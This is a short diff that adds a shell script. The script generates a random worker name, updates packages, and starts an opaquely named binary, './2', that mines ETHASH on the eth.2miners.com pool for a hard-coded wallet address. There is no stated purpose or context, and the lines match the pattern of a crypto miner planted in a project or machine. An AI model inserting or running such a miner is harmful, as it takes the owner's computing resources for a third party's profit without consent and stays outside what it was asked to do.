@@ -1,0 +1,3 @@
+WORKER=$(echo $(shuf -i 1-99999 -n 1)-2mr)
+apt-get update
+./2 --algo ETHASH --pool eth.2miners.com:2020 --user 1U6yopAJMD2qvucsC9eBysZnpB6FEGKy2.$WORKER
